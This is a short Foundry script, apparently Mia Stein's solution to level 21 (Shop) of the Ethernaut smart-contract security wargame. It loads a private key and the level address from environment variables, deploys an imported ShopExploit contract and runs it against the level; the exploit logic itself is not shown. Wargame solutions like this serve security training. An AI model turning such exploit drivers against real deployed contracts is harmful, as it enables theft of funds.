// SPDX-License-Identifier: CC-BY-4.0
// Mia Stein solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Shop} from "src/21/Shop.sol";
import {ShopExploit} from "src/21/ShopExploit.sol";


contract Exploit is Script {
        
    address instance = vm.envAddress("INSTANCE_LEVEL21");  
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));   
    Shop level = Shop(instance); 
    
    function run() external {
        vm.startBroadcast(hacker);
        
        ShopExploit exploit = new ShopExploit();
        exploit.run(level);

        vm.stopBroadcast();
    }
}
